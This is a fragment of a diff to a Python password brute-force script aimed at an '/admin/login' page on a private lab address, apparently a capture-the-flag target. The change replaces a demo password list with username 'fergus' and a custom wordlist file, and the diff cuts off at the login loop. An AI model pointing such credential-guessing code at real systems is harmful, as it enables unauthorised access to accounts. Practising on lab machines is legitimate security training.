@@ -5,16 +5,13 @@ import requests
 
 host = 'http://10.10.10.191'
 login_url = host + '/admin/login'
-username = 'admin'
-wordlist = []
+username = 'fergus'
+fname = "custom.txt"
 
-
-#Generate 50 incorrect passwords
-for i in range(50):
-	wordlist.append('Password{i}'.format(i = i))
-
-# Add the correct password to the end of the list 
-wordlist.append('adminadmin')
+with open(fname) as f:
+	content = f.readlines()
+	word1 = [x.strip() for x in content]
+	wordlist = word1
 
 for password in wordlist:
 	session = requests.Session()
